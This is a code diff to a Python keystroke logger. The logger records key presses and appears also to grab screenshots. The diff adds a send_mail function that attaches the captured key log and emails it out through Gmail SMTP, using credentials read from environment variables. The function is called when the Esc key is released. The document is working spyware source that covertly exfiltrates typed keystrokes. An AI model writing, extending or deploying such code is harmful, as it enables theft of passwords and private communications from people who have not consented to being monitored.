@@ -1,4 +1,7 @@
 # Libraries
+import os
+from dotenv import load_dotenv
+
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
@@ -26,14 +29,61 @@ from requests import get
 from multiprocessing import Process, freeze_support
 from PIL import ImageGrab
 
-keys_information = 'key_log.txt'
+load_dotenv()
 
-file_path = '/Users/_milindpathak_/projects/keyStrokeLogger'
+keys_information = 'key_log.txt'
+email_address = os.getenv('EMAIL_ADDRESS')
+password = os.getenv('PASSWORD')
+toaddr = os.getenv('EMAIL_ADDRESS')
+
+file_path = os.getenv('FILE_PATH')
 extend = '/'
+
+def send_mail(filename, attachment, toaddr):
+    
+    fromaddr = email_address
+    
+    msg = MIMEMultipart()
+    
+    msg['From'] = fromaddr
+    
+    msg['To'] = toaddr
+    
+    msg['Subject'] = 'Log File'
+    
+    body = "hello baudi"
+    
+    msg.attach(MIMEText(body, 'plain'))
+    
+    filename = filename
+    attachment = open(attachment, 'rb')
+    
+    p = MIMEBase('application', 'octet-stream')
+    
+    p.set_payload((attachment).read())
+    
+    encoders.encode_base64(p)
+    
+    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
+    
+    msg.attach(p)
+    
+    s = smtplib.SMTP('smtp.gmail.com', 587)
+    
+    s.starttls()
+    
+    s.login(fromaddr, password)
+    
+    text = msg.as_string()
+    
+    s.sendmail(fromaddr, toaddr, text)
+    
+    s.quit()
+
+
 
 count = 0
 keys = []
-
 
 def on_press(key):
     global keys, count
@@ -62,6 +112,7 @@ def write_file(keys):
 
 def on_release(key):
     if key == Key.esc:
+        send_mail(keys_information, file_path + extend + keys_information, toaddr)
         return False
 
 
